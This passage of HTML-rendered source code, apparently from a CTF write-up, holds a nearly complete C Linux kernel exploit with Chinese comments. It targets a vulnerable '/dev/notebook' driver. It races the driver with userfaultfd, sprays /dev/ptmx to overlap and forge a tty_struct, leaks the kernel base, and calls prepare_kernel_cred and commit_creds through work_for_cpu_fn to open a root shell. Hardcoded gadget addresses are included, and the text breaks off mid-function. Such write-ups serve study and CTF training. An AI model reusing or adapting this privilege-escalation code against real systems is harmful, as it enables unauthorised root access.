class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;semaphore.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint32_t</span> u32;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">\tperror(msg);       \\</span></span><br><span class=\"line\"><span class=\"meta\">\texit(1);\t\t   \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_ELEM 0x100</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span>&#123;</span> </span><br><span class=\"line\">\tSWAPGS_POP_RET, IRETQ, COMMIT_CREDS,</span><br><span class=\"line\">\tPREPARE_KERNEL_CRED, </span><br><span class=\"line\">\tSUB_RSP_RET ,PUSH_RDI_POP_RSP_POP_RET,</span><br><span class=\"line\">\tPOP_RDI ,POP_RSP,</span><br><span class=\"line\">\tMOV_RDI_RAX_POP_RET,</span><br><span class=\"line\">\tTERMINATOR</span><br><span class=\"line\">&#125;;<span class=\"comment\">//PREPARE_KERNEL_CRED, COMMIT_CREDS, &#125;;</span></span><br><span class=\"line\">u64 a[MAX_ELEM];</span><br><span class=\"line\"><span class=\"comment\">//tty_struct结构体的大小</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class=\"line\"><span class=\"comment\">//如果我们申请0x2E0的空间，slab分配的堆实际大小为0x400 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REAL_HEAP_SIZE 0x400</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> RAW_KERNEL_BASE 0xffffffff81000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect1[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> ptmx_fds[<span class=\"number\">0x100</span>];<span class=\"comment\">// 测了我很久才发现这个b被不知道谁溢出了 加两个保护挡一下</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect2[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">init</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\ta[SWAPGS_POP_RET] \t\t\t= <span class=\"number\">0xffffffff810637d4</span>;</span><br><span class=\"line\">\ta[IRETQ] \t\t\t\t\t= <span class=\"number\">0xffffffff810338bb</span>;</span><br><span class=\"line\">\ta[COMMIT_CREDS] \t\t\t= <span class=\"number\">0xffffffff810a9b40</span>;</span><br><span class=\"line\">\ta[PREPARE_KERNEL_CRED]\t\t= <span class=\"number\">0xffffffff810a9ef0</span>;</span><br><span class=\"line\">\ta[SUB_RSP_RET] \t\t\t\t= <span class=\"number\">0xffffffff8100354f</span>;</span><br><span class=\"line\">\ta[PUSH_RDI_POP_RSP_POP_RET] = <span class=\"number\">0xffffffff8143f4e1</span>;</span><br><span class=\"line\">\ta[POP_RDI]\t\t\t\t    = <span class=\"number\">0xffffffff81007115</span>;</span><br><span class=\"line\">\ta[POP_RSP] \t\t\t\t\t= <span class=\"number\">0xffffffff810bc110</span>;</span><br><span class=\"line\">\ta[MOV_RDI_RAX_POP_RET]\t\t= <span class=\"number\">0xffffffff81045833</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 work_for_cpu_fn = <span class=\"number\">0xffffffff8109eb90</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">addKernelBase</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; TERMINATOR ;i++)&#123;</span><br><span class=\"line\">\t\ta[i] += kernel_base_addr - <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getshell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;UID is %d&quot;</span>, getuid());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;Get shell&quot;</span>);</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Get shell failed&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 user_cs, user_ss, user_sp, user_flags;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t__asm__ (</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pop user_flags;&quot;</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *(*pkc)(<span class=\"type\">int</span>) = (<span class=\"type\">void</span> *(*)(<span class=\"type\">int</span>))(a[PREPARE_KERNEL_CRED]);</span><br><span class=\"line\">\t<span class=\"type\">void</span> (*cc)(<span class=\"type\">void</span> *) = (<span class=\"type\">void</span> (*)(<span class=\"type\">void</span> *))(a[COMMIT_CREDS]);</span><br><span class=\"line\">\t(*cc)((*pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">del</span><span class=\"params\">(<span class=\"type\">size_t</span> idx)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">gift</span><span class=\"params\">(<span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// 逆向 mynote_read可以得到</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">void</span> *buf;</span><br><span class=\"line\">\tu64 size;</span><br><span class=\"line\">&#125;notebook;</span><br><span class=\"line\"></span><br><span class=\"line\">notebook ntbk[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\">u64 fake_tty_struct[<span class=\"number\">128</span>];</span><br><span class=\"line\">u64 fake_tty_ops[<span class=\"number\">128</span>];</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> &#123;</span></span><br><span class=\"line\">\tu64 a[<span class=\"number\">4</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> <span class=\"title\">work</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">long</span> (*fn)(<span class=\"type\">void</span> *);</span><br><span class=\"line\">\t<span class=\"type\">void</span> *arg;</span><br><span class=\"line\">\t<span class=\"type\">long</span> ret;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tinit();</span><br><span class=\"line\">\tsaveState();</span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note_fd is %d&quot;</span>,note_fd);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// name的长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault_page = mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, </span><br><span class=\"line\">\t\t\t\t\t\tMAP_PRIVATE | MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">0</span> ,<span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x3ff</span> ,zero);<span class=\"comment\">// 重新申请一个0x400的块</span></span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x400</span> ,fault_page);<span class=\"comment\">// 返回上一个原块的地址 写完size就卡住</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgetchar();<span class=\"comment\">// 等待线程完成它的工作</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Info(&quot;ptmx_fds[%d] is %d&quot;, i, ptmx_fds[i]);</span></span><br><span class=\"line\">\t\tptmx_fds[i] = open(<span class=\"string\">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">//验证魔数</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(fake_tty_struct[<span class=\"number\">0</span>]  != <span class=\"number\">0x0000000100005401</span>)</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Magic number error, abort&quot;</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;fake_tty_struct&#x27;s addr is 0x%lx&quot;</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">// 此时gdb看内存 可以看到相关泄漏的地址</span></span><br><span class=\"line\">\tu64 ptm_unix98_ops_addr = fake_tty_struct[<span class=\"number\">3</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((ptm_unix98_ops_addr &amp; <span class=\"number\">0xFFF</span>) == <span class=\"number\">0x320</span>) ptm_unix98_ops_addr += <span class=\"number\">0x120</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tkernel_base_addr = ptm_unix98_ops_addr - <span class=\"number\">0xe8e440</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\taddKernelBase();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span> ,<span class=\"number\">0x400</span> ,zero);</span><br><span class=\"line\"></span><br><span class=\"line\">\tgift(ntbk);</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] = ntbk[<span class=\"number\">1</span>].buf;<span class=\"comment\">// ops&#x27;s addr</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">4</span>] = a[PREPARE_KERNEL_CRED];</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">5</span>] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">6</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfake_tty_ops[<span class=\"number\">12</span>] = work_for_cpu_fn;</span><br><span class=\"line\"></span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, fake_tty_ops);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;prepare kernel cred...&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)</span><br><span class=\"line\">\t\tioctl(ptmx_fds[i], <span class=\"number\">111</span>, <span class=\"number\">111</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;prepare&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;work_for_cpu_fn return 0x%lx&quot;</span>, fake_tty_struct[<span class=\"number\">6</span>]);</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] = ntbk[<span class=\"number\">1</span>].buf;<span class=\"comment\">// ops&#x27;s addr</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">4</span>] = a[COMMIT_CREDS];</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">5</span>] = fake_tty_struct[<span class=\"number\">6</span>];</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;commit creds...&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)</span><br><span class=\"line\">\t\tioctl(ptmx_fds[i], <span class=\"number\">233</span>, <span class=\"number\">233</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;commit&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tgetshell();</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class=\"line\">\t<span 